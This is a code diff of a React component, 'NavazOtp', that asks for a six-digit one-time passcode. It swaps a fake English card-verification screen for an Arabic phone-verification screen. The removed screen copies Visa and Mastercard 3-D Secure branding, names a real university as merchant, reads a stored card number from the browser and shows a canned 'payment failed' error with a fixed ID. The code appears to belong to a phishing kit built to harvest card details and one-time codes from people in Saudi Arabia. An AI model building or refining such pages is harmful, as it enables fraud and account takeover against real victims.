@@ -69,87 +69,40 @@ const NavazOtp = ({ setMode, checkMode }) => {
   return (
     <div className="w-full  lg:w-1/2 flex flex-col items-center justify-center  rounded-md">
       <form
-        className="bg-white border h-screen border-gray-300 rounded-md  p-3 text-sm w-full"
+        className="bg-white border h-screen border-gray-300 rounded-md  p-3 py-10 text-sm w-full"
+        dir="rtl"
         onSubmit={handleSubmit}
       >
-        <div className="flex w-full gap-x-3 items-center justify-around">
-          <div className="w-12 ">
-            <img src="/visa_logo.jpg" />
-          </div>
-          <div className="w-16 ">
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTlJeSetovZYxcpQmPuM-fu7k2EzUcVb3qU0w&s" />
-          </div>
-
-          <div className="w-12 ">
-            <img src="/Mastercard.png" />
-          </div>
-        </div>
-        <p className="py-2 text-xs font-bold">
-          to continue with your transaction , please enter the one-time passcode
-          sent to your mobile number or email address and click submit
+        <h2 className="font-bold text-xxl my-2  "> التحقق من رقم الهاتف</h2>
+        <p className="py-1 text-xs font-bold text-gray-500 flex flex-col gap-y-2">
+          <span> تم ارسال رسالة نصية إلي جوالك علي رقم الهاتف الخاص بك</span>
+          <span>يرجي إدخال رمز التحقق المرسل إلي جوالك +966 ********</span>
         </p>
-        <h2 className="font-semibold my-2 text-gray-500">
-          Transaction Details
-        </h2>
 
-        <div className="flex justify-between py-1">
-          <span className="font-bold"> Merchant:</span>
-          <span>Princess Nourah University</span>
-        </div>
-        <div className="flex justify-between py-1">
-          <span className="font-bold">Transaction Amount:</span>
-          <span className="" dir="rtl">
-            {" "}
-            30 ريال
-          </span>
-        </div>
-        <div className="flex justify-between py-1">
-          <span className="font-bold">Card Number:</span>
-          <span>
-            ********
-            {sessionStorage.getItem("cardNumber").split("").slice(15) || "9666"}
-          </span>
-        </div>
-        <div className="flex justify-between py-1 items-center gap-x-2">
-          <span className="font-bold w-1/3"> Enter Code:</span>
+        <div className="flex justify-start p-1 py-3 items-start gap-y-2 w-full flex-col">
+          <span className="font-bold"> رمز التحقق *</span>
           <input
             value={otp}
             required
             onChange={(e) => setOtp(e.target.value)}
             dir="ltr"
-            maxLength={6}
-            minLength={6}
+            placeholder="******"
             inputMode="numeric"
+            minLength={6}
+            maxLength={6}
             type="text"
-            className="border px-3 py-1 font-light border-gray-400 text-base outline-[#ffc107] rounded-md w-1/2"
+            className="border px-3 py-1  border-gray-300 text-base text-right outline-[#ffc107] rounded-md w-full"
           />
         </div>
 
-        {error ? (
-          <div className="w-full text-center text-red-500  absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center">
-            <div className="bg-white py-5 px-2 md:w-1/4 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3">
-              <AiOutlineCloseCircle className="text-6xl" />
-              <div className="flex flex-col w-full items-center justify-center">
-                <span>نتيجة الدفع فشل معرف الدفع </span>
-                <span>82A27833M4589370G</span>
-              </div>
-              <button
-                className="bg-gray-900 text-white w-11/12 py-3"
-                onClick={() => setError(false)}
-              >
-                حاول مرة ثانية
-              </button>
-            </div>
-          </div>
-        ) : (
-          ""
-        )}
-
-        <div className="w-full flex items-center justify-center py-10">
+        <div className="w-full flex items-center justify-center py-5">
           {" "}
-          <button className="w-fit px-5 flex justify-center items-center py-2  bg-black text-white ">
-            Submit
+          <button className="  px-5 flex justify-center items-center py-2  bg-sky-800 text-white w-11/12 rounded-md ">
+            تأكيد
           </button>
+        </div>
+        <div className="flex w-full gap-x-3 items-center justify-center">
+          سيتم إرسال رسالة كود التحقق خلال دقيقة
         </div>
       </form>
       {loading ? (
